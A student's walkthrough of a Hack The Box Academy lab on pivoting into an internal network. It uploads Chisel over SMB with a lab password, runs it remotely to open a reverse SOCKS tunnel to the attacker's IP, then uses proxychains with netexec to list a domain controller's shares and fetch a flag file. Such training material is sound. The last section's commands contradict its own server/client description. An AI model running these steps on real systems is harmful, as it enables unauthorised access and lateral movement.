## Proxychains with CME 

In the module [Pivoting, Tunneling, and Port Forwarding](https://academy.hackthebox.com/module/details/158/), we discussed how to use tools such as Chisel & Proxychains to connect to networks to that we don't have direct access to. This section will revisit the concept to understand how we can attack other networks via a compromised host. 


### Scenario 


We are working on an internal Pentest. We performed a network scan and identified and compromised only one host (10.129.204.133). By running **ipconfig** on this compromised host, we notice it has two network adapters. Its ARP table shows another host with the IP address 172.16.1.10. Based on the information we collected, we have the following scenario: 


![Proxychains](/Valid-Account-Information-Gathering/Proxychains-with-CME/images/network.png) 


To attack DC01 and any other machine in that network (172.16.1.0/24), we must set up a tunnel between our attack host and MS01. Therefore, all commands executed by CME go through MS01. 


### Set Up the Tunnel 


- We will use [Chisel](https://github.com/jpillora/chisel) to set up our tunnel. Let's navigate to [release](https://github.com/jpillora/chisel/releases) and download the latest Windows binary for our compromised machine and the newest Linux binary to use on our attack host and perform the following steps: 

1. Download and run Chisel on our Attack host. 

#### Chisel - Reverse Tunnel 

![Proxychains](/Valid-Account-Information-Gathering/Proxychains-with-CME/images/chisel.png) 

2. Download and Upload Chisel for Windows to the Target Host: 

#### Upload Chisel 

```

Jesta81@htb[/htb]$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz -O chisel.exe.gz -q
Jesta81@htb[/htb]$ gunzip -d chisel.exe.gz
Jesta81@htb[/htb]$ crackmapexec smb 10.129.204.178 -u grace -p Inlanefreight01! --put-file ./chisel.exe \\Windows\\Temp\\chisel.exe 

```

![Proxychains](/Valid-Account-Information-Gathering/Proxychains-with-CME/images/chisel-2.png) 


3. Execute **chisel.exe** to connect to our Chisel server using the netexec command execution option **-x** (We will discuss this option more in the [Command Execution](https://academy.hackthebox.com/module/84/section/812) section) 

```

$ netexec smb 10.129.204.178 -u grace -p Inlanefreight01! -x "C:\Windows\Temp\chisel.exe client 10.10.15.14:9999 R:socks"

```

![Proxychains](/Valid-Account-Information-Gathering/Proxychains-with-CME/images/chisel-3.png) 

![Proxychains](/Valid-Account-Information-Gathering/Proxychains-with-CME/images/chisel-4.png) 

- We can also confirm the tunnel is running by checking if port TCP 1080 is listening: 

![Proxychains](/Valid-Account-Information-Gathering/Proxychains-with-CME/images/netstat.png) 

```

$ netstat -lnpt | grep 1080 

```

5. We need to configure proxychains to use the Chisel default port TCP 1080. We need to make sure to include socks5 127.0.0.1 1080 in the ProxyList section of the configuration file as follows: 

![Proxychains](/Valid-Account-Information-Gathering/Proxychains-with-CME/images/tail.png) 


6. We can now use CrackMapExec through Proxychains to reach the IP 172.16.1.10: 

![Proxychains](/Valid-Account-Information-Gathering/Proxychains-with-CME/images/dc-shares.png) 


7. We can see a share named **flag** if we use the **--pattern txt** flag or **regex . with the --share "share name"** flags we can see that there is a file called flag.txt in that share. We can retreive it with the following commmands. 

```

# proxychains -q netexec smb 172.16.1.10 -u grace -p 'Inlanefreight01!' --shares

# proxychains -q netexec smb 172.16.1.10 -u grace -p 'Inlanefreight01!' --share flag --pattern txt

# proxychains -q netexec smb 172.16.1.10 -u grace -p 'Inlanefreight01!' --share flag --regex .

# proxychains -q netexec smb 172.16.1.10 -u grace -p 'Inlanefreight01!' --share flag --get-file flag.txt flag.txt 

```


![Proxychains](/Valid-Account-Information-Gathering/Proxychains-with-CME/images/flag.png) 


### Killing Chisel on the Target Machine 

Once we have finished, we need to kill the Chisel process. To do this, we will use the option **-X to execute PowerShell commands** and run the **PowerShell command Stop-Process -Name chisel -Force.** We will discuss command execution in more detail in the [Command Execution](https://academy.hackthebox.com/module/84/section/812) section. Once we do this, the terminal where we ran the Chisel client command execution should conclude as follows: 


#### Kill the Chisel Client 

```

$ nxc smb 10.129.204.178 -u grace -p 'Inlanefreight01!' -X "Stop-Process -Name chisel -Force" 

```


![Proxychains](/Valid-Account-Information-Gathering/Proxychains-with-CME/images/kill.png) 



### Windows as the Chisel server and Linux as the Chisel client 


- We can also do the opposite by starting Chisel as a server on the Windows workstation and using our attack host as the client. To start Chisel as the server, we will use the **option server --socks5.** 

- Now to connect to our target machine Chisel server and enable the proxy, we need to use the **option socks after the IP and port.** 

- Now we can use proxychains again just in reverse. 


```

$ nxc smb 10.129.204.178 -u grace -p 'Inlanefreight01!' -x "C:\Windows\Temp\chisel.exe client 10.10.15.14:8080 R:socks" 

$ /opt/Chisel/chisel_arm client 10.129.204.178:8080 socks 

$ proxychains -q netexec smb 172.16.1.10 -u grace -p Inlanefreight01! --shares 

```

![Proxychains](/Valid-Account-Information-Gathering/Proxychains-with-CME/images/reverse.png) 

![Proxychains](/Valid-Account-Information-Gathering/Proxychains-with-CME/images/reverse-2.png) 
